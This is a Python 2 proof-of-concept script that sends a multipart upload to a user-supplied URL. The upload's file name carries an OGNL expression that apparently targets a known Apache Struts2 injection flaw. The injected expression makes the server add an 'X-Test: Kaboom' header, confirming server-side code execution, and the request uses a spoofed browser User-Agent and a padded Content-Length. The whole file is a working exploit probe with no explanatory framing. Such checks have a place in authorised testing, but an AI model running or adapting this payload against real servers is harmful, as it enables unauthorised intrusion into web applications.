#! /usr/bin/env python
# encoding:utf-8
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
def poc():
    register_openers()
    datagen, header = multipart_encode({"image1": open("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2"
    header["Content-Length"]="10000000"
    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)
    response = urllib2.urlopen(request)
    print response.read()
poc()
